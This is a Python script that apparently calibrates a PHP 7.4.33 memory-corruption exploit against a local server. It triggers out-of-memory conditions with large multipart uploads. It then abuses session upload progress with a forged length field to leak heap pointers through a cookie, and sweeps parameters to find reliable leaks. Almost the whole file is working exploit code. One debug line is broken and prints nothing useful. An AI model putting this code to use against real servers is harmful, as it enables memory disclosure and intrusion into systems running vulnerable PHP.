"""Forge-position calibration sweep for 7.4.33.
OOM trigger: 5 x 1.8MB sub-limit fields (the 12MB big field is blocked by the per-field ceiling).
Leak request: SID + progress + N v-fields + forge. Sweep forge size + forged-len offset.
A hit = cookie contains >=8 heap pointers (2MB-aligned)."""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18108/"

def fire_oom():
    t = E.Target(URL, timeout=90.0, verbose=False)
    parts = [{"name": f"m{i:04d}", "data": b"M" * int(1.8 * 1024 * 1024)} for i in range(5)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    ]
    try:
        t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
    except Exception:
        pass
    time.sleep(0.4)

def fire_leak(n_v, forge_size, forged_len_off, forged_val=0x1000):
    t = E.Target(URL, timeout=90.0, verbose=False)
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n_v):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * forge_size)
    if forged_len_off + 8 <= forge_size:
        struct.pack_into("<Q", forge, forged_len_off, forged_val)
    if forged_len_off + 8 < forge_size:
        forge[forged_len_off + 8] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=90.0)
    raw = E.parse_cookie(resp)
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    best = max(c.values()) if c else 0
    return len(raw), best, raw

print("=== 7.4.33 forge-position sweep ===", flush=True)
hits = []
for n_v in [800, 841, 880]:
    for forge_size in [32, 48, 64, 79, 96, 128]:
        for foff in [0x08, 0x10, 0x18]:
            fire_oom()
            clen, best, raw = fire_leak(n_v, forge_size, foff)
            mark = "  <<< HIT" if best >= 8 else ""
            print(f"n_v={n_v} forge={forge_size}B foff=0x{foff:x}: cookie={clen}B heapmax={best}{mark}", flush=True)
            if best >= 8:
                hits.append((n_v, forge_size, foff, clen, best))
                print(f"   top: {[(hex(k), v) for k, v in Counter().most_common(0)]}", flush=True)
            time.sleep(0.2)

print(f"\n=== {len(hits)} hits ===", flush=True)
for h in hits:
    print(f"  n_v={h[0]} forge={h[1]}B foff=0x{h[2]:x} cookie={h[3]}B heapmax={h[4]}", flush=True)
